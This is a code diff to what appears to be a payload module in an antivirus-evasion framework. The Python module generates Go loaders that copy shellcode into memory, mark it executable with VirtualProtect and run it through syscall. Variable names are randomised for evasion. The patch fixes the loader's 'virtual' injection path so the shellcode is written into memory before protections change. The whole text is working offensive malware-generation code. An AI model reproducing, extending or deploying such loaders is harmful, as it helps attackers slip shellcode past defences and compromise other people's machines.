@@ -68,6 +68,7 @@ class PayloadModule:
         rand_var = evasion_helpers.randomString()
         procVirtualProtect = evasion_helpers.randomString()
         proc_out = evasion_helpers.randomString()
+        vprotectendvar = evasion_helpers.randomString()
 
         # Generate the shellcode
         if not self.cli_shellcode:
@@ -144,12 +145,15 @@ class PayloadModule:
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, addr)
             payload_code += "var %s uintptr\n" %(proc_out)
-            payload_code += "%s, _, %s = %s.Call(%s, uintptr(len(%s)), 0x20, 0)\n" %(proc_out, err, procVirtualProtect, addr, shellcode_variable)
+            payload_code += "var %s uintptr\n" %(vprotectendvar)
+            payload_code += "for " + rand_var + ", %s := range []byte(%s) {\n" %(value, shellcode_variable)
+            payload_code += buff + "[" + rand_var + "] = %s\n}\n" % (value)
+            payload_code += "%s, _, %s = %s.Call(%s, uintptr(len(%s)), 0x20, uintptr(unsafe.Pointer(&%s)))\n" %(proc_out, err, procVirtualProtect, addr, shellcode_variable, vprotectendvar)
             payload_code += "if %s == 0 {\nos.Exit(1)\n}\n" %(proc_out)
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             payload_code += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, heapallocout)
-        payload_code += "for " + rand_var + ", %s := range []byte(%s) {\n" %(value, shellcode_variable)
-        payload_code += buff + "[" + rand_var + "] = %s\n}\n" % (value)
+            payload_code += "for " + rand_var + ", %s := range []byte(%s) {\n" %(value, shellcode_variable)
+            payload_code += buff + "[" + rand_var + "] = %s\n}\n" % (value)
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" % (addr)
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
